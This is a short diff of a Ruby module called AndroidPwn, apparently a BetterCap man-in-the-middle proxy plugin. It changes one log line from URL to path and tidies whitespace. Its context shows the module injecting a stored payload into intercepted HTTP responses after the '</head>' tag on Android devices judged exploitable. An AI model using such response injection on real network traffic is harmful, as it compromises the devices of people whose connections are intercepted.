@@ -41,10 +41,10 @@ class AndroidPwn < BetterCap::Proxy::Module
     if is_exploitable?( request, response )
       BetterCap::Logger.info ""
       BetterCap::Logger.info "Pwning Android Device :".red
-      BetterCap::Logger.info "  URL    : http://#{request.host}#{request.url}"
+      BetterCap::Logger.info "  URL    : http://#{request.host}#{request.path}"
       BetterCap::Logger.info "  AGENT  : #{request.headers['User-Agent']}"
       BetterCap::Logger.info ""
-      
+
       response.body.sub!( '</head>', "</head>#{@@payload}" )
     end
   end
